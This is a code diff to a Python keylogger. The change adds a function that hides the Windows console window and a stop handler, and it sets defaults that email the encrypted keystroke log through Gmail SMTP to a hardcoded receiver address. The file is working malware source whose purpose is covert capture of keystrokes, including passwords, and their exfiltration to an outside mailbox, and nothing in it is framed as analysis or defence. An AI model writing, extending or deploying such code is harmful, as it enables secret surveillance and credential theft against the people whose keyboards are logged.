@@ -3,9 +3,15 @@ import sys
 import argparse
 import logging
 import time
-from datetime import datetime, timedelta
+import ctypes
+
 from pynput import keyboard
+from datetime import datetime, timedelta
 from utils import generate_key, save_key, encrypt_data, send_email
+
+def hide_console():
+    if os.name == 'nt':
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def on_press(key, log_file, key_obj):
     try:
@@ -62,6 +68,9 @@ def start_keylogger(log_file, email_config=None, send_time=None):
                 if send_time and datetime.now() >= next_send_time:
                     send_log_email(log_file, "secret.key", email_config)
                     next_send_time += timedelta(days=1)
+        except KeyboardInterrupt:
+            print("Keylogger stopped by user")
+            listener.stop()
         except Exception as e:
             logging.error(f"Error: {e}")
 
@@ -70,11 +79,11 @@ def main():
     parser.add_argument("--log-file", default="log.txt", help="Path to the log file")
     parser.add_argument("--send-email", action="store_true", help="Enable email sending")
     parser.add_argument("--send-time", default="22:00", help="Time to send the email (HH:MM)")
-    parser.add_argument("--smtp-server", help="SMTP server for sending email")
-    parser.add_argument("--port", type=int, help="SMTP server port")
-    parser.add_argument("--sender-email", help="Sender email address")
-    parser.add_argument("--sender-password", help="Sender email password")
-    parser.add_argument("--receiver-email", help="Receiver email address")
+    parser.add_argument("--smtp-server", default="smtp.gmail.com", help="SMTP server for sending email")
+    parser.add_argument("--port", type=int, default=587, help="SMTP server port")
+    parser.add_argument("--sender-email", default="", help="Sender email address")
+    parser.add_argument("--sender-password", default="", help="Sender email password")
+    parser.add_argument("--receiver-email", default="zesh3ng@gmail.com", help="Receiver email address")
     args = parser.parse_args()
 
     email_config = None
@@ -93,3 +102,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+hide_console()
